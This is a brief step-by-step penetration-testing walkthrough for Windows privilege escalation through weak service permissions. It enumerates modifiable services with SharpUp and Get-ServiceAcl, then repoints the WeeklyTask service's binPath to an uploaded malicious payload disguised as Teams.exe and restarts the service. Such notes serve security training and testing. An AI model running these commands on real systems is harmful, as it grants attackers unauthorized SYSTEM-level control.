- Unquoted Service Paths

- Weak Service Permissions

### Step 1: Identify Modifiable Services:<br>

  `C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices`

### Step 2: Check Service Permissions:<br>
  `powershell-import C:\Tools\Get-ServiceAcl.ps1`
  `powershell Get-ServiceAcl -Name WeeklyTask | select -expand Access`

"
ServiceRights     : ChangeConfig, Start, Stop<br>
AccessControlType : AccessAllowed<br>
IdentityReference : NT AUTHORITY\Authenticated Users<br>
IsInherited       : False<br>
InheritanceFlags  : None<br>
PropagationFlags  : None<br>
"

### Step 3: Validate Current Binary Path:
  `sc qc WeeklyTask`

"
BINARY_PATH_NAME   : "C:\Program Files\Services\Update.exe"
"
We have successfully displayed the current path of the WeeklyTask service.

### Step 4: Upload Malicious Payload:
  Next, we upload a malicious payload to the system that we will configure the service to execute. We’ll place our payload in a temporary directory.

### Step 5: Change the Service's Binary Path
  Now that we have our payload uploaded, we can change the service's binary path to point to our malicious executable.

`sc config WeeklyTask binPath= C:\Temp\Teams.exe`

### Step 6: Stop and Start the Service
`run sc stop WeeklyTask`
`run sc start WeeklyTask`
